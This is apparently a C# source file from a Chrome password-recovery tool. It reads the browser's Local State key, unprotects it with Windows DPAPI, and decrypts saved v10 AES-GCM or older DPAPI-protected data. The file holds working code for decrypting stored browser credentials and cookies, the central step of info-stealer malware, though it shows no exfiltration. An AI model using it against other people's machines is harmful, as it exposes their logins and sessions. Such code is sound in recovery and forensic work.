using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;

namespace ChromeRCV
{
    internal sealed class Crypt
    {
        public static byte[] GetMasterKey(string directory)
        {
            string filePath = directory + "\\Local State";
            if (File.Exists(filePath) == false)
                return null;

            string data = File.ReadAllText(filePath);
            byte[] masterKey = Convert.FromBase64String(SimpleJSON.JSON.Parse(data)["os_crypt"]["encrypted_key"]);

            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);

            try {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex) {
                Console.WriteLine(ex.ToString());
            }
            return null;
        }

        public static string DPAPIDecrypt(byte[] encryptedData)
        {
            if (encryptedData.Length <= 0 || encryptedData == null)
                return string.Empty;

            string decryptedData = Encoding.UTF8.GetString(
                ProtectedData.Unprotect(
                    encryptedData, null, DataProtectionScope.CurrentUser
                )
            );
            return decryptedData;
        }

        public static string DecryptData(byte[] data, byte[] key)
        {
            // chrome version >= 80
            if (IsV10ByteArray(data))
            {
                byte[] iv = data.Skip(3).Take(12).ToArray();
                byte[] encryptedData = data.Skip(15).ToArray();

                return Encoding.UTF8.GetString(Sodium.SecretAeadAes.Decrypt(encryptedData, iv, key));
            }
            else {
                // chrome version < 80
                return DPAPIDecrypt(data);
            }
        }

        public static bool IsV10ByteArray(byte[] array)
        {
            if (array.Length <= 0 || array == null)
                return false;

            return array[0] == 'v' && array[1] == '1' && array[2] == '0';
        }
    }
}
